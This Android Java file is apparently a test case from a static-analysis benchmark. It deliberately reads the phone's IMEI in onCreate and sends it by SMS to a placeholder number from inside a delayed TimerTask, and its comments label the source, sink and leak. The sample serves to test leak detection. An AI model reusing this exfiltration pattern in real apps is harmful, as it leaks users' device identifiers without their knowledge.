package de.ecspride;

import java.util.Timer;
import java.util.TimerTask;

import android.content.Context;
import android.os.Bundle;
import android.app.Activity;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;

/**
 * @testcase_name Threading_TimerTask1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sensitive Sensitive data is read in onCreate() and sent out later
 * 		in code controlled by a Java TimerTask.
 * @dataflow onCreate: source -> imei -> timer -> MyTask.run() -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to correctly handle Java's TimerTask infrastructure.
 */
public class MainActivity extends Activity {
	
	private String imei;
	
	private class MyTask extends TimerTask {

		@Override
		public void run() {
			SmsManager sm = SmsManager.getDefault();
			sm.sendTextMessage("+49 1234", null, imei, null, null); //sink, leak
		}
		
	}
	
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		
		TelephonyManager telephonyManager = (TelephonyManager)
				getApplicationContext().getSystemService(Context.TELEPHONY_SERVICE);
		imei = telephonyManager.getDeviceId(); // source
		
		Timer timer = new Timer();
		timer.schedule(new MyTask(), 2000);
	}
	

}
